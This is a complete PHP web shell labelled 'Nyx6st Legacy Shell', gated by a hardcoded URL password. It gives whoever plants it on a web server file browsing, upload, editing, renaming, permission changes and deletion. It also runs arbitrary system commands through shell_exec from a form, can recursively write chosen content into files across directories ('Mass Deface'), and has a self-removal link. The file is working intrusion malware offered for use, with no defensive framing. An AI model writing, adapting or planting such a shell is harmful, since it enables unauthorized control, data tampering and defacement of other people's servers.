<?php
// ===[ CONFIG PASSWORD AKSES ]===
$pass = "nyx6priv8"; // site.com/nama.php?p=nyx6priv8
if (!isset($_GET['p']) || $_GET['p'] !== $pass) {
    die("Access denied.");
}

// ===[ SETUP AWAL ]===
error_reporting(0);
set_time_limit(0);

echo "<!DOCTYPE html><html><head><title>Nyx6st | Legacy Shell</title><style>
body {
  background-color: #000;
  color: #0ff;
  font-family: Consolas, monospace;
}
a { color: #0ff; text-decoration: none; }
table { width: 90%; margin: auto; border-collapse: collapse; }
td, th { padding: 6px; border: 1px solid #333; }
input, select, textarea {
  background: #111;
  color: #0f0;
  border: 1px solid #0ff;
  font-family: monospace;
}
textarea { width: 100%; height: 300px; }
h1 { text-align: center; color: #fff; }
hr { border: 0; border-top: 1px solid #0ff; }
</style></head><body>";

echo "<h1>Nyx6ist | Do What You Wanna Do</h1>";
echo "<center><font color='gray'>".php_uname()."</font></center><hr>";

// ===[ FILE MANAGER ]===
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
foreach($paths as $id => $part) {
    if($part == '' && $id == 0){
        echo '<a href="?p='.$pass.'&path=/">/</a>';
        continue;
    }
    if($part == '') continue;
    echo '<a href="?p='.$pass.'&path=';
    for($i=0;$i<=$id;$i++){
        echo $paths[$i];
        if($i != $id) echo "/";
    }
    echo '">'.$part.'</a>/';
}

// ===[ UPLOAD FILE ]===
if(isset($_FILES['file'])){
    if(@copy($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])){
        echo "<p style='color:lime;'>Upload success!</p>";
    } else {
        echo "<p style='color:red;'>Upload failed.</p>";
    }
}
echo "<form enctype='multipart/form-data' method='POST'>
Upload File: <input type='file' name='file'/>
<input type='submit' value='Upload'/>
</form><hr>";

// ===[ FILE VIEW / EDIT ]===
if(isset($_GET['filesrc'])){
    echo "<h3>Viewing: ".$_GET['filesrc']."</h3>";
    echo "<textarea readonly>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea>";
} elseif(isset($_GET['edit'])){
    if(isset($_POST['editcontent'])){
        file_put_contents($_GET['edit'], $_POST['editcontent']);
        echo "<p style='color:lime;'>File saved!</p>";
    }
    echo "<form method='POST'>
    <textarea name='editcontent'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea>
    <input type='submit' value='Save'/>
    </form>";
} else {
    $scandir = scandir($path);
    echo "<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>";
    foreach($scandir as $file){
        if($file == ".") continue;
        $fullpath = $path."/".$file;
        echo "<tr><td>";
        if(is_dir($fullpath)){
            echo "<a href='?p=$pass&path=$fullpath'>$file</a>";
        } else {
            echo "<a href='?p=$pass&filesrc=$fullpath'>$file</a>";
        }
        echo "</td><td>".(is_file($fullpath) ? filesize($fullpath) : '-')."</td>";
        echo "<td>".substr(sprintf('%o', fileperms($fullpath)), -4)."</td><td>";
        echo "<a href='?p=$pass&edit=$fullpath'>Edit</a> | ";
        echo "<a href='?p=$pass&rename=$fullpath'>Rename</a> | ";
        echo "<a href='?p=$pass&chmod=$fullpath'>Chmod</a> | ";
        echo "<a href='?p=$pass&delete=$fullpath' onclick=\"return confirm('Hapus?');\">Delete</a>";
        echo "</td></tr>";
    }
    echo "</table>";
}

// ===[ RENAME ]===
if(isset($_GET['rename'])){
    if(isset($_POST['newname'])){
        rename($_GET['rename'], dirname($_GET['rename']).'/'.$_POST['newname']);
        echo "<p style='color:lime;'>Renamed!</p>";
    }
    echo "<form method='POST'>New name: <input type='text' name='newname'/>
    <input type='submit' value='Rename'/></form>";
}

// ===[ CHMOD ]===
if(isset($_GET['chmod'])){
    if(isset($_POST['perm'])){
        chmod($_GET['chmod'], octdec($_POST['perm']));
        echo "<p style='color:lime;'>Permission changed!</p>";
    }
    echo "<form method='POST'>Permission: <input type='text' name='perm' value='".substr(sprintf('%o', fileperms($_GET['chmod'])), -4)."'/>
    <input type='submit' value='Chmod'/></form>";
}

// ===[ DELETE ]===
if(isset($_GET['delete'])){
    if(is_dir($_GET['delete'])){
        rmdir($_GET['delete']);
    } else {
        unlink($_GET['delete']);
    }
    echo "<p style='color:red;'>Deleted!</p>";
}

// ===[ PRIV8 TOOLBAR ]===
echo "<hr><h3>wtf panel</h3>";

// Exec CMD
if(isset($_POST['cmd'])){
    echo "<b>Command:</b> <code>{$_POST['cmd']}</code><br><pre>".shell_exec($_POST['cmd'])."</pre>";
}
echo "<form method='POST'>
<b>Shell Exec:</b><br>
<input type='text' name='cmd' style='width:70%;' placeholder='whoami || uname -a'/>
<input type='submit' value='Execute'/>
</form><hr>";

// Mass Deface
if(isset($_POST['mass_deface'])){
    $file_name = $_POST['file_name'];
    $content = $_POST['content'];
    function deface($dir, $file, $content){
        $sc = scandir($dir);
        foreach($sc as $d){
            if($d != "." && $d != ".."){
                $path = "$dir/$d";
                if(is_dir($path)) deface($path, $file, $content);
                file_put_contents("$dir/$file", $content);
            }
        }
    }
    deface($path, $file_name, $content);
    echo "<p style='color:lime;'>Mass deface done!</p>";
}
echo "<form method='POST'>
<b>Mass Deface:</b><br>
<input type='text' name='file_name' placeholder='index.php' style='width:40%;'/><br>
<textarea name='content' placeholder='Your script/code here' style='height:150px;'></textarea><br>
<input type='submit' name='mass_deface' value='Inject Mass'/>
</form><hr>";

// Kill Shell
if(isset($_GET['kill'])){
    unlink(__FILE__);
    die("<p style='color:red;'><b>Shell has been removed.</b></p>");
}
echo "<a href='?p=$pass&kill=true' onclick=\"return confirm('Yakin kill shell ini?')\" style='color:red;'>[ KILL SHELL FILE ]</a><hr>";

// FOOTER
echo "<center><small><a href='https://www.0x6ick.zone.id/?m=1' target='_blank' style='color:gray;'>Shell Rebuild by Nyx6st | Legacy mode</a></small></center>";

?>
